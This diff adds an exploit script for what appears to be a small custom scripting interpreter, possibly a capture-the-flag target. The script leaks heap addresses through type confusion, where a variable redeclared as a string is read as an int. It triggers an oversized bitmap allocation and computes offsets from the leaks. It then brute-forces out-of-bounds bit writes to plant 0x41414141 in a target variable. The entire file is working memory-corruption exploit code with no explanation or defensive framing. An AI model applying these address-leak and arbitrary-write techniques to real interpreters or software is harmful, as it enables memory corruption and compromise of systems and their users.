@@ -1,0 +1,117 @@
+print("=== Brute Force Write Test ===");
+
+print("Step 1: Leak addresses");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print("addr1:");
+print(addr1);
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("targetaddr:");
+print(targetaddr);
+
+print("Step 2: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 3: Calculate base addresses");
+int entryaddr = targetaddr - 768;
+int valueptraddr = entryaddr + 40;
+int bitmapptr = addr1 - 4096;
+int offset = valueptraddr - bitmapptr;
+int bitindex = offset * 8;
+print("Calculated bit_index:");
+print(bitindex);
+
+print("Step 4: Try writing test value at different offsets");
+print("Test value: 0x41414141 (1094795585)");
+int testvalue = 1094795585;
+
+print("Test 1: bit_index - 64 (8 bytes before)");
+int bitindex1 = bitindex - 64;
+set(b1, bitindex1 + 0, 0, 1);
+set(b1, bitindex1 + 6, 0, 1);
+set(b1, bitindex1 + 8, 0, 1);
+set(b1, bitindex1 + 14, 0, 1);
+set(b1, bitindex1 + 16, 0, 1);
+set(b1, bitindex1 + 22, 0, 1);
+set(b1, bitindex1 + 24, 0, 1);
+set(b1, bitindex1 + 30, 0, 1);
+int verify1 = target;
+print("Result 1:");
+print(verify1);
+if (verify1 == testvalue) {
+    print("SUCCESS at bit_index - 64!");
+}
+
+print("Test 2: bit_index - 32 (4 bytes before)");
+int bitindex2 = bitindex - 32;
+set(b1, bitindex2 + 0, 0, 1);
+set(b1, bitindex2 + 6, 0, 1);
+set(b1, bitindex2 + 8, 0, 1);
+set(b1, bitindex2 + 14, 0, 1);
+set(b1, bitindex2 + 16, 0, 1);
+set(b1, bitindex2 + 22, 0, 1);
+set(b1, bitindex2 + 24, 0, 1);
+set(b1, bitindex2 + 30, 0, 1);
+int verify2 = target;
+print("Result 2:");
+print(verify2);
+if (verify2 == testvalue) {
+    print("SUCCESS at bit_index - 32!");
+}
+
+print("Test 3: bit_index (calculated)");
+set(b1, bitindex + 0, 0, 1);
+set(b1, bitindex + 6, 0, 1);
+set(b1, bitindex + 8, 0, 1);
+set(b1, bitindex + 14, 0, 1);
+set(b1, bitindex + 16, 0, 1);
+set(b1, bitindex + 22, 0, 1);
+set(b1, bitindex + 24, 0, 1);
+set(b1, bitindex + 30, 0, 1);
+int verify3 = target;
+print("Result 3:");
+print(verify3);
+if (verify3 == testvalue) {
+    print("SUCCESS at bit_index!");
+}
+
+print("Test 4: bit_index + 32 (4 bytes after)");
+int bitindex4 = bitindex + 32;
+set(b1, bitindex4 + 0, 0, 1);
+set(b1, bitindex4 + 6, 0, 1);
+set(b1, bitindex4 + 8, 0, 1);
+set(b1, bitindex4 + 14, 0, 1);
+set(b1, bitindex4 + 16, 0, 1);
+set(b1, bitindex4 + 22, 0, 1);
+set(b1, bitindex4 + 24, 0, 1);
+set(b1, bitindex4 + 30, 0, 1);
+int verify4 = target;
+print("Result 4:");
+print(verify4);
+if (verify4 == testvalue) {
+    print("SUCCESS at bit_index + 32!");
+}
+
+print("Test 5: bit_index + 64 (8 bytes after)");
+int bitindex5 = bitindex + 64;
+set(b1, bitindex5 + 0, 0, 1);
+set(b1, bitindex5 + 6, 0, 1);
+set(b1, bitindex5 + 8, 0, 1);
+set(b1, bitindex5 + 14, 0, 1);
+set(b1, bitindex5 + 16, 0, 1);
+set(b1, bitindex5 + 22, 0, 1);
+set(b1, bitindex5 + 24, 0, 1);
+set(b1, bitindex5 + 30, 0, 1);
+int verify5 = target;
+print("Result 5:");
+print(verify5);
+if (verify5 == testvalue) {
+    print("SUCCESS at bit_index + 64!");
+}
+
+print("If none worked, try different entry offsets or bitmap buffer locations");
+
